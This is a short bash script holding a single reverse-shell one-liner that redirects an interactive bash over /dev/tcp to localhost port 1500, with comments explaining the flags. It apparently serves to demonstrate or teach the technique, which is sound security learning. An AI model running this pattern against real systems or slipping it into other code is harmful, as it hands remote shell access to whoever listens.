#!/bin/bash

bash -i > /dev/tcp/localhost/1500 0>&1
# -i for interactive shell
# 0>&1 to redirect the output into the tty of listening device
